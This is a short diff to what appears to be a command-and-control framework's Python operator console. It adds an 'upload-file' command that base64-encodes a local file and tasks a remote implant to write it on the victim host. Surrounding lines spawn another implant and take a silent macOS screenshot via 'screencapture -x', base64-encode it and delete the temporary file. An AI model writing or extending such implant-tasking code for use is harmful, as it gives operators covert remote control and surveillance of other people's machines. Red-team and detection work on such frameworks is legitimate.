@@ -374,6 +374,26 @@ def runcommand(command, randomuri):
     elif command.lower() == 'sai' or command.lower() == 'sai ':
       new_task('startanotherimplant', randomuri)
 
+    elif "upload-file" in command.lower():
+      source = ""
+      destination = ""
+      s = ""
+      args = argp(command)
+      try:
+        if args:
+          with open(args.source, "rb") as source_file:
+            s = source_file.read()
+            source = base64.b64encode(s)
+        if s:
+          destination = args.destination.replace("\\","\\\\")
+          print ""
+          print "Uploading %s to %s" % (args.source, destination)
+          uploadcommand = "upload-file \"%s\":%s" % (destination, source)
+          new_task(uploadcommand, randomuri)
+      except Exception as e:
+        print "Error with source file: %s" % e   
+        traceback.print_exc()  
+
     elif 'get-screenshot' in command.lower():
       taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
       new_task(taskcmd, randomuri)
